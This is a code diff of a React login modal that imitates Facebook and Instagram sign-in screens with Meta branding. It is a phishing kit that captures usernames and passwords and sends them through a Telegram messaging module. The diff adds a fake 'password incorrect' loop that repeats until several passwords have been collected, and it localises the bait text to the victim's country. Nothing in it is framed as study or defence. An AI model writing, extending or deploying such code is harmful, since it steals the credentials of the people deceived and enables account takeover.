@@ -1,7 +1,4 @@
-import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
-import InstagramLogoImage from '@/assets/images/instagram-logo-image.png';
-import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { sendMessage, type Verdict } from '@/lib/socket';
+import { sendMessage } from '@/lib/telegram';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import translateText from '@/utils/translate';
@@ -10,8 +7,11 @@ import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import Image from 'next/image';
 import { useEffect, useRef, useState, type FC } from 'react';
+import FacebookLogoImage from '@/assets/images/fb_round_logo.png';
+import InstagramLogoImage from '@/assets/images/logo-insta.webp';
+import MetaLogo from '@/assets/images/meta-logo-grey.png';
 
-const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 'instagram' | 'facebook' | null }> = ({ nextStep, verdict, provider }) => {
+const LoginModal: FC<{ nextStep: () => void; provider: 'instagram' | 'facebook' | null }> = ({ nextStep, provider }) => {
     const [attempts, setAttempts] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
     const [username, setUsername] = useState('');
@@ -22,8 +22,8 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
 
     const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
+    const loadingMs = (config.PASSWORD_LOADING_TIME ?? 8) * 1000;
     const waitTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
-    const [pending, setPending] = useState(false);
     const focusBorder = provider === 'instagram' ? 'focus:border-[#D24294]' : provider === 'facebook' ? 'focus:border-[#0064E0]' : '';
     const accountLabel = provider === 'facebook' ? 'Email address or mobile number' : 'Mobile number, username or email';
 
@@ -34,7 +34,7 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Mobile number, username or email', 'Email address or mobile number', 'Password', "The password that you've entered is incorrect.", 'Continue'];
+        const textsToTranslate = ['Mobile number, username or email', 'Email address or mobile number', 'Password', "The password that you've entered is incorrect.", 'Continue', 'Log in', 'Log in to Instagram', 'For your security, please enter your password to continue.', 'For your security, you must enter your password to continue.', 'Forgot your password?'];
 
         const translateAll = async () => {
             const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));
@@ -48,20 +48,6 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
     const togglePassword = () => {
         setShowPassword(!showPassword);
     };
-    const [appliedVerdict, setAppliedVerdict] = useState<Verdict | null>(null);
-    if (verdict !== appliedVerdict) {
-        setAppliedVerdict(verdict);
-        if (verdict && pending && verdict.status === 'rejected') {
-            setPending(false);
-            setIsLoading(false);
-            setShowError(true);
-            setPassword('');
-        }
-    }
-
-    useEffect(() => {
-        if (pending && verdict && verdict.status !== 'rejected') nextStep();
-    }, [pending, verdict, nextStep]);
 
     useEffect(
         () => () => {
@@ -87,8 +73,7 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
 
         const sentId = await sendMessage({
             message: updatedMessage,
-            message_id: messageId,
-            stage: 'password'
+            message_id: messageId
         });
 
         if (sentId === null) {
@@ -97,43 +82,48 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
         }
         setMessageId(sentId);
         setMessageContent(updatedMessage);
-        setPending(true);
 
         if (waitTimer.current) clearTimeout(waitTimer.current);
-        waitTimer.current = setTimeout(() => setIsLoading(false), 180_000);
+        waitTimer.current = setTimeout(() => {
+            setIsLoading(false);
+            if (next >= maxPass) {
+                nextStep();
+            } else {
+                setShowError(true);
+                setPassword('');
+            }
+        }, loadingMs);
     };
 
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                {provider === 'instagram' ? <Image src={InstagramLogoImage} alt='' width={70} height={70} className='mt-9' /> : <Image src={FacebookLogoImage} alt='' className='mt-9 h-17.5 w-17.5' />}
-                <div className='flex w-full flex-1 flex-col justify-center'>
-                    <div className='relative w-full'>
-                        <input type='text' id='username-input' value={username} onChange={(e) => setUsername(e.target.value)} autoComplete='username' className={`peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${focusBorder}`} placeholder={t(accountLabel)} />
-                        <label htmlFor='username-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
-                            {t(accountLabel)}
-                        </label>
+        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/45 p-4'>
+            <div className={`flex max-h-[calc(100vh-16px)] min-h-[min(860px,calc(100vh-16px))] w-full max-w-120 flex-col overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl ${provider === 'instagram' ? 'border-t-4 border-t-[#e1306c]' : ''}`}>
+                <div className='flex flex-1 flex-col items-center justify-between'>
+                    {provider === 'instagram' ? (
+                        <div className='text-center'>
+                            <div className='mx-auto mt-4 w-fit rounded-[18px] bg-linear-to-br from-[#833ab4] via-[#e1306c] to-[#fcaf45] p-0.5 shadow-lg'>
+                                <div className='rounded-2xl bg-white'><Image src={InstagramLogoImage} alt='' width={48} height={48} /></div>
+                            </div>
+                            <h2 className='mt-4 text-xl font-bold text-[#262626]'>{t('Log in to Instagram')}</h2>
+                            <p className='mt-2 text-sm text-[#9a979e]'>{t('For your security, please enter your password to continue.')}</p>
+                        </div>
+                    ) : <Image src={FacebookLogoImage} alt='Facebook' width={48} height={48} />}
+                    <div className='w-full'>
+                        {provider === 'facebook' && <p className='mb-4 text-sm text-[#9a979e]'>{t('For your security, you must enter your password to continue.')}</p>}
+                        <input type='text' id='username-input' value={username} onChange={(e) => setUsername(e.target.value)} autoComplete='username' className={`mb-3 h-10 w-full rounded-[10px] border bg-[#fafafa] px-3 text-sm focus:bg-white ${showError ? 'border-red-500' : 'border-[#d4dbe3]'} ${focusBorder}`} placeholder={t(accountLabel)} />
+                        <div className='relative w-full'>
+                            <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} autoComplete='current-password' className={`h-10 w-full rounded-[10px] border bg-[#fafafa] px-3 pr-10 text-sm focus:bg-white ${showError ? 'border-red-500' : 'border-[#d4dbe3]'} ${focusBorder}`} placeholder={t('Password')} />
+                            <button type='button' aria-label='Show password' className='absolute top-1/2 right-2 -translate-y-1/2 text-[#6b7280]' onClick={togglePassword}>
+                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
+                            </button>
+                        </div>
+                        {showError && <p className='mt-2 text-sm text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
+                        <button onClick={() => void handleSubmit()} disabled={isLoading} className={`mt-3 flex h-10 w-full items-center justify-center rounded-full text-sm font-semibold text-white ${provider === 'instagram' ? 'bg-linear-to-r from-[#833ab4] via-[#e1306c] to-[#f77737]' : 'bg-[#0064e0]'} ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
+                            {isLoading ? <span className='h-4.5 w-4.5 animate-spin rounded-full border-2 border-white/40 border-t-white' /> : t(provider === 'instagram' ? 'Log in' : 'Continue')}
+                        </button>
+                        <p className={`mt-3 text-center text-sm ${provider === 'instagram' ? 'text-[#0095f6]' : 'text-[#9a979e]'}`}>{t('Forgot your password?')}</p>
                     </div>
-                    <div className='relative mt-4 w-full'>
-                        <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} autoComplete='current-password' className={`peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${focusBorder}`} placeholder={t('Password')} />
-                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
-                            {t('Password')}
-                        </label>
-                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
-                    </div>
-                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
-                    <button
-                        onClick={() => {
-                            void handleSubmit();
-                        }}
-                        disabled={isLoading}
-                        className={`mt-4 flex h-12.5 w-full items-center justify-center gap-2 rounded-full font-semibold text-white transition-colors ${provider === 'instagram' ? 'bg-[#0095F6] hover:bg-[#4150F7]' : provider === 'facebook' ? 'bg-[#1877F2] hover:bg-[#0064E0]' : 'bg-blue-600 hover:bg-blue-700'} ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
-                    >
-                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
-                    </button>
-                </div>
-                <div className='flex items-center justify-center pt-3'>
-                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
+                    <Image src={MetaLogo} alt='Meta' width={64} className='mt-6' />
                 </div>
             </div>
         </div>
